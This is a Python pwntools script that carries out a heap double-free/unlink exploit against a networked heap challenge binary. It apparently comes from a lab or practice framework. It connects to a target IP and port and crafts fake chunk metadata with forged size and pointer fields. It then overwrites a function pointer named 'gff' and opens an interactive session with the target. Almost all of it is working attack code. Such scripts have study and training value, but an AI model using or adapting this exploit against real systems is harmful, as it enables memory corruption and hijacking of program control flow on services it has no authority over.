#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc (ALSR - on)'''

import sys
sys.path.append("../..")
from pwn import *
from modules.script_tools import *

property = {
    '&p0':0x0,
    }
# read options from share
options = {'dIP' :  get_share('dIP'),
                'port' : get_share('port'),
                'wait' : get_share('wait')}


libc = ELF('../../vulnerabilities/heap/heap64static')
gffaddress =libc.symbols['gff']
property['&p0'] = libc.symbols['a'] + 8*2000

# begin exploit
ip, port = options['dIP'], int(options['port'])
p = remote(ip, port)

if eval(options['wait']):
    _ = raw_input("You can attach now.\nPress Any Key to begin...")

def new_chunk(size,content):
    while p.can_recv() : p.recvline()
    p.sendline('m')
    p.recvline() # malloc
    p.recvline() # size
    p.sendline(str(size))
    p.recvline() # content
    p.sendline(content)
    p.recvuntil('!\n') # ok

def free_chunk(no):
    while p.can_recv() : p.recvline()
    p.sendline('f')
    p.recvline() # free
    p.sendline(str(no))
    p.recvuntil('!\n') # ok

def edit_chunk(no,content):
    while p.can_recv() : p.recvline()
    p.sendline('e')
    p.recvline() # edit
    p.sendline(str(no))
    p.sendline(content)
    p.recvline('!\n') # ok

def print_chunk(no):
    while p.can_recv() : p.recvline()
    p.sendline('p')
    p.recvline() # print
    p.sendline(str(no))
    return p.recvuntil('end')

new_chunk(504,'A'*504)
new_chunk(512,'B'*512)

free_chunk(0)
free_chunk(1)

#关键payload
content = p64(0x0)  + p64(0x1f1) + p64(property['&p0'] - 0x18) + p64(property['&p0'] - 0x10) + 'a' * (0x200 - 48) + p64(0x1f0) + p64(0x110)
new_chunk(768, content)
free_chunk(1)

print 'double free !'
content = 'a'*24 + p64(gffaddress)
edit_chunk(0,content)




# overwrite gff
print 'overwrite gff...'
content = 'g'
edit_chunk(0,content)


p.interactive()






